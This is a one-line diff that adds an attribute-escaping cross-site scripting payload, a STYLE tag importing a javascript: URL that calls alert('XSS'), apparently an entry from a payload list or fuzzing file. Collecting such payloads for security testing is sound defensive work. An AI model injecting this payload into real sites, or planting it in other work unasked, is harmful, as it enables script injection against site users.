@@ -1,0 +1,1 @@
+"><STYLE>@import"javascript:alert('XSS')";</STYLE>
